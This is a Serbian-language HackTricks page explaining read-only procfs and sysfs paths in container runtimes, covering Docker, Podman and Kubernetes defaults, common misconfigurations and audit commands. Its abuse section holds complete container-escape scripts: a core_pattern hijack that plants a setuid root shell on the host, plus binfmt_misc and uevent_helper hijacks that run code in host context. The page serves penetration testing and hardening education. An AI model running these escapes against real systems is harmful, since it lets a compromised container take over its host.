# Putanje sistema samo za čitanje

{{#include ../../../../banners/hacktricks-training.md}}

Putanje sistema samo za čitanje predstavljaju zasebnu zaštitu u odnosu na maskirane putanje. Umesto da runtime potpuno sakrije putanju, izlaže je ali je montira kao samo za čitanje. Ovo je uobičajeno za odabrane procfs i sysfs lokacije gde je pristup za čitanje prihvatljiv ili operativno neophodan, ali bi upisi bili previše opasni.

Svrha je jednostavna: mnogi kernel interfejsi postaju mnogo opasniji kada su pisivi. Montiranje samo za čitanje ne uklanja svu vrednost za izviđanje, ali sprečava kompromitovan workload da menja osnovne fajlove okrenute ka kernelu kroz tu putanju.

## Funkcionisanje

Runtimes često označavaju delove prikaza proc/sys kao samo za čitanje. U zavisnosti od runtime-a i hosta, ovo može uključivati putanje kao što su:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Stvarna lista varira, ali model je isti: dozvoli vidljivost gde je potrebna, podrazumevano zabrani mutacije.

## Lab

Pregledajte listu putanja samo za čitanje koje je deklarisao Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Pregledajte montiran prikaz proc/sys iz unutrašnjosti kontejnera:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

Sistemske putanje koje su samo za čitanje sužavaju veliki opseg zloupotreba koje utiču na host. Čak i kada napadač može da pregleda procfs ili sysfs, nemogućnost pisanja tamo uklanja mnoge direktne puteve izmene koji uključuju parametre kernela, obradu padova (crash handlers), pomoćnike za učitavanje modula (module-loading helpers) ili druge kontrolne interfejse. Izloženost nije uklonjena, ali prelazak od otkrivanja informacija do uticaja na host postaje teži.

## Misconfigurations

Glavne greške su otmaskiranje ili ponovno montiranje osetljivih puteva kao read-write, izlaganje host proc/sys sadržaja direktno pomoću writable bind mounts, ili korišćenje privileged režima koji efikasno zaobilaze sigurnije runtime podrazumevane postavke. U Kubernetes, `procMount: Unmasked` i privileged workloads često idu zajedno sa slabijom zaštitom proc. Još jedna česta operativna greška je pretpostavka da zato što runtime obično montira ove putanje kao read-only, svi workloads i dalje nasleđuju taj podrazumevani režim.

## Abuse

Ako je zaštita slaba, počnite traženjem writable proc/sys unosa:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Kada postoje writable entries, sledeći putevi visokog značaja uključuju:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Šta ove komande mogu otkriti:

- Upisivi unosi pod `/proc/sys` često znače da container može menjati ponašanje host kernela umesto samo da ga pregleda.
- `core_pattern` je posebno važan zato što upisiva vrednost vidljiva hostu može biti pretvorena u putanju za izvršavanje koda na hostu izazivanjem rušenja procesa nakon postavljanja pipe handler-a.
- `modprobe` otkriva helper koji kernel koristi za tokove vezane za učitavanje modula; klasičan je cilj velike vrednosti kada je upisiv.
- `binfmt_misc` pokazuje da li je moguća registracija custom interpretatora. Ako je registracija upisiva, ovo može postati execution primitive umesto samo information leak.
- `panic_on_oom` kontroliše odluku kernela koja važi za ceo host i može tako pretvoriti resource exhaustion u host denial of service.
- `uevent_helper` je jedan od najočitijih primera upisive sysfs helper putanje koja proizvodi izvršavanje u kontekstu hosta.

Zanimljiva otkrića uključuju upisive host-facing proc kontrole ili sysfs unose koji bi normalno trebali biti read-only. U tom trenutku workload se pomera iz ograničenog prikaza container-a ka stvarnom uticaju na kernel.

### Potpun primer: `core_pattern` Host Escape

Ako je `/proc/sys/kernel/core_pattern` upisiv iz kontejnera i pokazuje na prikaz kernela hosta, može se zloupotrebiti za izvršavanje payload-a nakon rušenja procesa:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ako putanja zaista dopre do host kernel, payload se izvršava na hostu i ostavlja setuid shell iza sebe.

### Potpuni primer: `binfmt_misc` registracija

Ako je `/proc/sys/fs/binfmt_misc/register` moguće upisati, registracija prilagođenog interpretera može dovesti do izvršavanja koda kada se odgovarajući fajl pokrene:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Ako je `binfmt_misc` koji je dostupan hostu zapisiv, rezultat može biti code execution u putanji interpreter-a koju pokreće kernel.

### Potpun primer: `uevent_helper`

Ako je `/sys/kernel/uevent_helper` zapisiv, kernel može pozvati helper sa host putanje kada se pokrene odgovarajući događaj:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Razlog zbog kojeg je ovo toliko opasno je što se helper path rešava iz perspektive datotečnog sistema hosta, umesto iz bezbednog konteksta ograničenog na kontejner.

## Provere

Ove provere određuju da li je izloženost procfs/sysfs-a samo za čitanje tamo gde se očekuje i da li workload i dalje može da menja osetljive kernel interfejse.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Zanimljivo ovde:

- Normalan zaštićeni workload bi trebalo da izlaže vrlo malo upisivih /proc/sys unosa.
- `/proc/sys` putevi koji su upisivi često su važniji od običnog pristupa samo za čitanje.
- Ako runtime kaže da je putanja read-only ali je u praksi upisiva, pažljivo pregledajte propagaciju mount-a, bind mount-ove i podešavanja privilegija.

## Podrazumevana ponašanja runtime-a

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Docker definiše zadatu listu putanja samo za čitanje za osetljive proc unose | izlaganje host proc/sys mount-ova, `--privileged` |
| Podman | Enabled by default | Podman primenjuje zadate putanje samo za čitanje osim ako nisu eksplicitno ublažene | `--security-opt unmask=ALL`, široki host mount-ovi, `--privileged` |
| Kubernetes | Inherits runtime defaults | Koristi model putanja samo za čitanje osnovnog runtime-a osim ako ga ne oslabe podešavanja Pod-a ili host mount-ovi | `procMount: Unmasked`, privilegovani workload-i, host proc/sys mount-ovi koji su upisivi |
| containerd / CRI-O under Kubernetes | Runtime default | Obično se oslanja na OCI/runtime zadate vrednosti | isto kao red za Kubernetes; direktne izmene runtime konfiguracije mogu oslabiti ponašanje |

Ključna poenta je da su sistemske putanje samo za čitanje obično prisutne kao podrazumevane u runtime-u, ali ih je lako potkopati korišćenjem privilegovanih režima ili host bind mount-ova.
{{#include ../../../../banners/hacktricks-training.md}}
